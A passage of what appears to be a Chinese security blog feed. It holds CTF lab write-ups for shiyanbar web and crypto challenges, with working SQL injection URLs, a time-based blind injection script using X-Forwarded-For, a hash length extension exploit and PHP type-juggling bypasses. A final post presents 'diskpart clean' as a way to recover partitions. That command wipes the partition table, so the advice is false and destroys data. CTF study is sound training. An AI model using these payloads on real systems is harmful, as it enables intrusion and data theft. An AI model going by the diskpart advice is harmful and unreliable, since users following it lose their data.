class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$token</span>)&amp;&amp;!empty(<span class="variable">$emailAddress</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$token</span>)!=10) die(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>!=<span class="string">'0'</span>) die(<span class="string">'fail'</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT count(*) as num from `user` where token='<span class="variable">$token</span>' AND email='<span class="variable">$emailAddress</span>'"</span>;</span><br><span class="line"><span class="variable">$r</span> = mysql_query(<span class="variable">$sql</span>) or die(<span class="string">'db error'</span>);</span><br><span class="line"><span class="variable">$r</span> = mysql_fetch_assoc(<span class="variable">$r</span>);</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$r</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span>&gt;0)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token要等于0而且长度要等于10    0000000000</p><p><img src="15-7.png" alt></p><h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p><img src="16-1.png" alt></p><p><img src="16-2.png" alt></p><p>输入username=QNKCDZO</p><p><img src="16-3.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">     <span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       print_r(<span class="variable">$flag</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>伟大的科学家php方言道：成也布尔，败也布尔。<br>回去吧骚年</p><p>分析：<br>　　代码意思是把post提交的password值经过”反序列化”得到一个数组，要求数组里的user和pass都等于某个值时就打印flag。<br>　　但是我们不知道两处???到底是什么，因此无法考虑用php函数构造这样的值。<br>　　别忘了还有一个提示： “伟大的科学家php方言道：成也布尔，败也布尔” ，bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>　　构造password值为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p><p>　　在密码栏中提交构造的值，即可获取flag: ctf{dwduwkhduw5465}</p><p><img src="16-4.png" alt></p><h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><p><img src="17-1.png" alt></p><p><img src="17-2.png" alt></p><p><img src="17-3.png" alt></p><p><img src="17-4.png" alt></p><h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><p><img src="18-1.png" alt></p><p>应该是题目出了问题，直接访问index.php得到flag</p><p><img src="18-2.png" alt></p><h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p><img src="19-1.png" alt></p><p><img src="19-2.png" alt></p><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hash长度扩展攻击<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">samplehash='</span>571580b26c65f306376d4f64e53cb5c7<span class="string">'</span></span><br><span class="line"><span class="string">s1='</span>0x<span class="string">'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]</span></span><br><span class="line"><span class="string">s2='</span>0x<span class="string">'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]</span></span><br><span class="line"><span class="string">s3='</span>0x<span class="string">'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]</span></span><br><span class="line"><span class="string">s4='</span>0x<span class="string">'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]</span></span><br><span class="line"><span class="string">print s1,'</span>\n<span class="string">',s2,'</span>\n<span class="string">',s3,'</span>\n<span class="string">',s4</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line">import my_md5</span><br><span class="line"><span class="comment">#reference:</span></span><br><span class="line"><span class="comment">#   http://www.freebuf.com/articles/web/69264.html</span></span><br><span class="line"><span class="comment">#problem link:</span></span><br><span class="line"><span class="comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span></span><br><span class="line"></span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s1)</span><br><span class="line"><span class="comment">#exp</span></span><br><span class="line">secret = <span class="string">"a"</span>*15</span><br><span class="line">secret_admin = secret+<span class="string">'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'</span></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br><span class="line"></span><br><span class="line">得到：getmein:e18dfd8404515016d3aeeea2aa196909</span><br></pre></td></tr></table></figure></p><p>burp抓包改包<br>username=admin<br>password=admin+\x80\x00……admin<br>\x80\x00要在hex里面修改</p><p><img src="19-3.png" alt></p><p><img src="19-4.png" alt></p><p>或者用<br>username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin</p><p><img src="19-5.png" alt></p><h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p><img src="20-1.png" alt></p><p><img src="20-2.png" alt></p><p><img src="20-3.png" alt></p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'key'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p><h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p><img src="21-1.png" alt></p><p>双写绕过加上空格过滤</p><p><img src="21-2.png" alt></p><h2 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h2><p><img src="22-1.png" alt></p><p><img src="22-2.png" alt></p><h2 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h2><p><img src="23-1.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(SELECT database())a))–+</p><p><img src="23-2.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select group_concat(table_name) from information_schema.tables where table_schema=’web1’)a))–+</p><p><img src="23-3.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select group_concat(column_name) from information_schema.columns where table_name=’flag’ )a))–+</p><p><img src="23-4.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select flag from flag)a))–+</p><p><img src="23-5.png" alt></p><h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><p><img src="24-1.png" alt></p><p><img src="24-2.png" alt></p><p><img src="24-3.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</span><br><span class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </span><br><span class="line">        <span class="built_in">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </span><br><span class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">die(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </span><br><span class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup  （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2  （从第二行开始查询）</p><p>#注释<br>此时密码只要为空即可查询成功 </p><p><img src="24-4.png" alt></p><h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h2><p><img src="25-1.png" alt></p><p><img src="25-2.png" alt></p><p><img src="25-3.png" alt></p><p>发现逗号之后内容的都截断了</p><p><img src="25-4.png" alt></p><p>尝试xff注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">allString=string.lowercase + string.uppercase + string.digits</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,33):</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> allString:</span><br><span class="line">        data=<span class="string">"11'+(select case when (substring((select flag from flag ) from &#123;0&#125; for 1 )='&#123;1&#125;') then sleep(4) else 1 end ) and '1'='1"</span>.format(str(i),str1)</span><br><span class="line">        headers=&#123;<span class="string">"x-forwarded-for"</span>:data&#125;</span><br><span class="line">        try:</span><br><span class="line">            res=requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout, e:</span><br><span class="line">            flag += str1</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'flag:'</span> + flag</span><br></pre></td></tr></table></figure></p><p>即可跑出</p><p><img src="25-5.png" alt></p><h2 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h2><p><img src="26-1.png" alt></p><p><img src="26-2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=’\<span class="variable">$_POST</span>[‘user’]’ and password=’\<span class="variable">$_POST</span>[‘password’]’”;</span><br><span class="line">输入username= <span class="string">'='</span>   password= <span class="string">'='</span></span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=<span class="string">''</span>=<span class="string">''</span> and password=<span class="string">''</span>=<span class="string">''</span> </span><br><span class="line">user=”返回的是NULL=”也是符合条件的，最后就是</span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> 1 and 1”;</span><br></pre></td></tr></table></figure><p><img src="26-3.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;西普实验室-web题目学习&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>西普实验室—-密码学</title>
    <link href="http://archimesan.me/2018/01/30/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>http://archimesan.me/2018/01/30/西普实验吧-密码学/</id>
    <published>2018-01-30T08:49:12.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>西普实验室-密码学题目学习</p><a id="more"></a><h2 id="这里没有key"><a href="#这里没有key" class="headerlink" title="这里没有key"></a>这里没有key</h2><p><img src="1_1.png" alt></p><p><img src="1_2.png" alt></p><p><img src="1_3.png" alt></p><h2 id="chinese-hacker"><a href="#chinese-hacker" class="headerlink" title="chinese hacker"></a>chinese hacker</h2><p><img src="2_1.png" alt></p><p><img src="2_2.png" alt></p><p>ubuntu系统，所以安装了一下mdbtools<br>sudo apt-get install mdbtools mdbtools-gmdb mdbtools-dev</p><p><img src="2_3.png" alt></p><p><img src="2_4.png" alt></p><p>并不是base64加密，是base32解密即可</p><h2 id="压缩的问题"><a href="#压缩的问题" class="headerlink" title="压缩的问题"></a>压缩的问题</h2><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p><img src="3_3.png" alt></p><p><img src="3_4.png" alt></p><p>用该段代码作为解压密码即可。</p><p><img src="3_5.png" alt></p><h2 id="一段奇怪的代码"><a href="#一段奇怪的代码" class="headerlink" title="一段奇怪的代码"></a>一段奇怪的代码</h2><p><img src="4_1.png" alt></p><p><img src="4_2.png" alt></p><p><img src="4_3.png" alt></p><h2 id="最近在论证一个问题，到底是先有鸡还是先有蛋"><a href="#最近在论证一个问题，到底是先有鸡还是先有蛋" class="headerlink" title="最近在论证一个问题，到底是先有鸡还是先有蛋"></a>最近在论证一个问题，到底是先有鸡还是先有蛋</h2><p><img src="5_1.png" alt></p><p>电脑键盘解密– key</p><h2 id="最近听说刘翔离婚了"><a href="#最近听说刘翔离婚了" class="headerlink" title="最近听说刘翔离婚了"></a>最近听说刘翔离婚了</h2><p><img src="6_1.png" alt></p><p><img src="6_2.png" alt></p><h2 id="摩擦摩擦"><a href="#摩擦摩擦" class="headerlink" title="摩擦摩擦"></a>摩擦摩擦</h2><p><img src="7_1.png" alt></p><p>摩斯密码解密</p><p><img src="7_2.png" alt></p><h2 id="凯撒是罗马共和国杰出的军事统帅"><a href="#凯撒是罗马共和国杰出的军事统帅" class="headerlink" title="凯撒是罗马共和国杰出的军事统帅"></a>凯撒是罗马共和国杰出的军事统帅</h2><p><img src="8_1.png" alt></p><p>凯撒解密</p><p><img src="8_2.png" alt></p><h2 id="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"><a href="#古典密码的安全性不高，但仍然十分美妙，请破译下面的密文" class="headerlink" title="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"></a>古典密码的安全性不高，但仍然十分美妙，请破译下面的密文</h2><p><img src="9_1.png" alt></p><p><img src="9_2.png" alt></p><h2 id="数码管"><a href="#数码管" class="headerlink" title="数码管"></a>数码管</h2><p><img src="10_1.png" alt></p><p><img src="10_2.png" alt></p><p><img src="10_3.jpeg" alt></p><p><img src="10_4.jpeg" alt></p><p><img src="10_5.jpeg" alt></p><h2 id="一个img文件"><a href="#一个img文件" class="headerlink" title="一个img文件"></a>一个img文件</h2><p>太麻烦不想弄</p><h2 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h2><p><img src="11_1.png" alt></p><p>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN<br>提示键盘了，按照给出的字母顺序在键盘上画出字母的形状，就是答案</p><h2 id="密文-rot13"><a href="#密文-rot13" class="headerlink" title="密文 rot13"></a>密文 rot13</h2><p><img src="12_1.png" alt></p><p>先rot13再md5</p><p><img src="12_2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;西普实验室-密码学题目学习&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>磁盘分区恢复</title>
    <link href="http://archimesan.me/2017/12/29/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%81%A2%E5%A4%8D/"/>
    <id>http://archimesan.me/2017/12/29/磁盘分区恢复/</id>
    <published>2017-12-29T03:31:16.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>利用window自带的cmd命令恢复磁盘分区</p><a id="more"></a><h1 id="按windows键，右键点击运行，再左键点击以管理员身份运行"><a href="#按windows键，右键点击运行，再左键点击以管理员身份运行" class="headerlink" title="按windows键，右键点击运行，再左键点击以管理员身份运行"></a>按windows键，右键点击运行，再左键点击以管理员身份运行</h1><h3 id="输入diskpart-按enter"><a href="#输入diskpart-按enter" class="headerlink" title="输入diskpart,按enter"></a>输入diskpart,按enter</h3><p><img src="1.png" alt></p><h3 id="输入list-disk-按enter"><a href="#输入list-disk-按enter" class="headerlink" title="输入list disk,按enter"></a>输入list disk,按enter</h3><p><img src="2.png" alt></p><h3 id="输入select-disk-X-X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少-按enter"><a href="#输入select-disk-X-X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少-按enter" class="headerlink" title="输入select disk X(X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少)按enter"></a>输入select disk X(X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少)按enter</h3><p>选择后输入clean</p><p><img src="3.png" alt></p><p>搞定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用window自带的cmd命令恢复磁盘分区&lt;/p&gt;
    
    </summary>
    
    
      <category term="经验分享" scheme="http://archimesan.me/tags/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>快速抓取网页内容</title>
    <link href="http://archimesan.me/2017/12/28/%E5%BF%AB%E9%80%9F%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/"/>
    <id>http://archimesan.me/2017/12/28/快速抓取网页内容/</id>
    <published>2017-12-28T07:11:36.000Z</published>
    <updated>2017-12-28T07:15:18.777Z</updated>
    
